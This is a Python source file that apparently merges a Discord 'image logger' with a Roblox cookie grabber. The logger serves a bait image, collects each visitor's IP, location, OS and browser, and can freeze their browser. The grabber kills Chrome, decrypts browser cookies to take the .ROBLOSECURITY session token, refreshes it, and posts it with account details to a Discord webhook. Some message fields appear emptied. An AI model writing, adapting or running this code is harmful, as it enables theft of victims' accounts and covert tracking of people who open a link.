import os
import json
import base64
import browser_cookie3
import sqlite3
import subprocess
import shutil
import win32crypt
from Crypto.Cipher import AES
from discordwebhook import Discord
import httpx
import re
import requests
import robloxpy
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

# Image Logger Configuration
image_logger_config = {
    # BASE CONFIG #
    "webhook": "YOUR_IMAGE_LOGGER_WEBHOOK_URL",  # Replace with your image logger webhook URL
    "image": "https://pbs.twimg.com/media/FMdDYmZX0AAbDt_.jpg",
    "imageArgument": True,
    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

# Roblox Cookie Stealer Configuration
roblox_stealer_config = {
    "webhook_url": "YOUR_ROBLOX_STEALER_WEBHOOK_URL",  # Replace with your Roblox stealer webhook URL
    "dummy_message": "Loading...",
}

# Image Logger Functions
blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error, webhook_url):
    requests.post(webhook_url, json={
        "username": image_logger_config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": image_logger_config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n``````",
        }]
    })

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    webhook_url = image_logger_config["webhook"]
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(webhook_url, json={
            "username": image_logger_config["username"],
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": image_logger_config["color"],
                "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }]
        }) if image_logger_config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if image_logger_config["vpnCheck"] == 2:
            return
        if image_logger_config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if image_logger_config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if image_logger_config["antiBot"] == 3:
            return
        if image_logger_config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if image_logger_config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": image_logger_config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": image_logger_config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(webhook_url, json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        webhook_url = image_logger_config["webhook"]
        s = self.path
        query_components = dict(parse.parse_qsl(parse.urlsplit(s).query))

        if image_logger_config["imageArgument"] and "url" in query_components:
            url = query_components["url"]
        else:
            url = False

        endpoint = self.path

        coords = query_components["coords"] if "coords" in query_components else None

        if image_logger_config["redirect"]["redirect"]:
            self.send_response(302)
            self.send_header('Location', image_logger_config["redirect"]["page"])
            self.end_headers()
            return

        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()

        try:
            ip = self.client_address[0]
            useragent = self.headers['user-agent']
            makeReport(ip, useragent, coords, endpoint, url)
        except Exception as e:
            reportError(traceback.format_exc(), webhook_url)
        
        if image_logger_config["crashBrowser"]:
            self.wfile.write(b"<!DOCTYPE html><html><head><meta charset='utf-8'><title>Freeze</title></head><body><script>while(true);</script></body></html>")
            return

        if image_logger_config["message"]["doMessage"]:
            if image_logger_config["message"]["richMessage"]:
                self.wfile.write(f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>{image_logger_config["message"]["message"]}</title><link href="https://fonts.googleapis.com/css?family=Google+Sans" rel="stylesheet"><style>body {{background-color: #121212;}}h1 {{font-family: 'Google Sans', sans-serif;font-size: 3em;font-weight: 400;letter-spacing: -0.05em;color: white;text-align: center;}}.neon-wrapper {{display: flex;align-items: center;justify-content: center;width: 100%;height: 90vh;}}.neon-text {{animation: flicker 1.5s infinite alternate;color: #fff;}}@keyframes flicker {{0%,19%,21%,23%,25%,54%,56%,100% {{text-shadow: 0 0 6px #fff,0 0 42px {str(image_logger_config["color"])};}}20%,24%,55% {{text-shadow: none;}}}}</style></head><body><div class="neon-wrapper"><h1 class="neon-text">{image_logger_config["message"]["message"]}</h1></div></body></html>""".encode())
                return
            else:
                self.wfile.write(f"<!DOCTYPE html><html><head><meta charset='utf-8'><title>{image_logger_config["message"]["message"]}</title></head><body><h1>{image_logger_config["message"]["message"]}</h1></body></html>".encode())
                return

        if image_logger_config["buggedImage"]:
            self.wfile.write(binaries["loading"])
            return

        try:
            image_url = url if url else image_logger_config["image"]
            image_data = requests.get(image_url).content
            self.wfile.write(image_data)
        except Exception as e:
            reportError(traceback.format_exc(), webhook_url)
            self.wfile.write(binaries["loading"])

# Roblox Cookie Stealer Functions
try:
    subprocess.call("TASKKILL /f /IM CHROME.EXE")
except FileNotFoundError:
    print("")

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def CookieLog():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default",
                           "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("SELECT encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
    key = get_encryption_key()
    for encrypted_value, in cursor.fetchall():
        decrypted_value = decrypt_data(encrypted_value, key)
        return decrypted_value
    db.close()

def PlanB():
    data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

cookies = PlanB()

if CookieLog() == None:
    PlanB()

def get_local_ip():
    ip = requests.get('http://api.ipify.org').text
    return ip

def refresh_cookie(auth_cookie):
    csrf_token = generate_csrf_token(auth_cookie)
    headers, cookies = generate_headers(csrf_token, auth_cookie)
    req = httpx.post("https://auth.roblox.com/v1/authentication-ticket", headers=headers, cookies=cookies, json={})
    auth_ticket = req.headers.get("rbx-authentication-ticket", "Failed to get authentication ticket")
    headers.update({"RBXAuthenticationNegotiation": "1"})
    req1 = httpx.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=headers,
                      json={"authenticationTicket": auth_ticket})
    new_auth_cookie = re.search(".ROBLOSECURITY=(.*?);", req1.headers["set-cookie"]).group(1)
    return new_auth_cookie

def generate_csrf_token(auth_cookie):
    csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie})
    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
    return csrf_txt

def generate_headers(csrf_token, auth_cookie):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Roblox/WinInet",
        "origin": "https://www.roblox.com",
        "referer": "https://www.roblox.com/my/account",
        "x-csrf-token": csrf_token
    }
    cookies = {".ROBLOSECURITY": auth_cookie}
    return headers, cookies

# Main Execution
if __name__ == "__main__":
    # Roblox Cookie Stealer
    roblox_cookie = CookieLog()
    if roblox_cookie:
        check = robloxpy.Utils.CheckCookie(roblox_cookie).lower()
        if check != "valid cookie":
            roblox_cookie = refresh_cookie(roblox_cookie)

        ip_address = get_local_ip()
        info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
        roblox_id = info["UserID"]
        rap = robloxpy.User.External.GetRAP(roblox_id)
        friends = robloxpy.User.Friends.External.GetCount(roblox_id)
        age = robloxpy.User.External.GetAge(roblox_id)
        creation_date = robloxpy.User.External.CreationDate(roblox_id)
        rolimons = f"https://www.rolimons.com/player/{roblox_id}"
        roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
        headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false").text
        headshot_json = json.loads(headshot_raw)
        headshot = headshot_json["data"][0]["imageUrl"]
        username = info['UserName']
        robux = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
        premium_status = info['IsPremium']
        discord = Discord(url=roblox_stealer_config["webhook_url"])  # Use Roblox stealer webhook URL
        discord.post(
            username="BOT - Pirate 🍪",
            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
            embeds=[
                {
                    "title": "💸 +1 Result Account 🕯️",
                    "thumbnail": {"url": headshot},
                    "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                    "fields": [
                        {"name": "Username", "value": f"``````", "inline": True},
                        {"name": "Robux Balance", "value": f"``````", "inline": True},
                        {"name": "Premium Status", "value": f"``````", "inline": True},
                        {"name": "Creation Date", "value": f"``````", "inline": True},
                        {"name": "RAP", "value": f"``````", "inline": True},
                        {"name": "Friends", "value": f"``````", "inline": True},
                        {"name": "Account Age", "value": f"``````", "inline": True},
                        {"name": "IP Address", "value": f"``````", "inline": True},
                    ],
                }
            ],
        )
        discord.post(
            username="BOT - Pirate 🍪",
            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
            embeds=[
                {"title": ".ROBLOSECURITY", "description": f"``````"}
            ],
        )
    else:
        print("Failed to retrieve Roblox cookie.")

    # Image Logger (You'll need to set up a web server to serve the image)
    # This part needs a web server to run.  You can use Python's built-in http.server for testing.
    # Example: python -m http.server 8000
    # Then, access the image logger through http://localhost:8000/your_image.jpg

    from http.server import HTTPServer
    PORT = 8000  # Choose a port
    server_address = ('', PORT)
    httpd = HTTPServer(server_address, ImageLoggerHandler)
    print(f"Starting image logger server on port {PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Stopping server...")
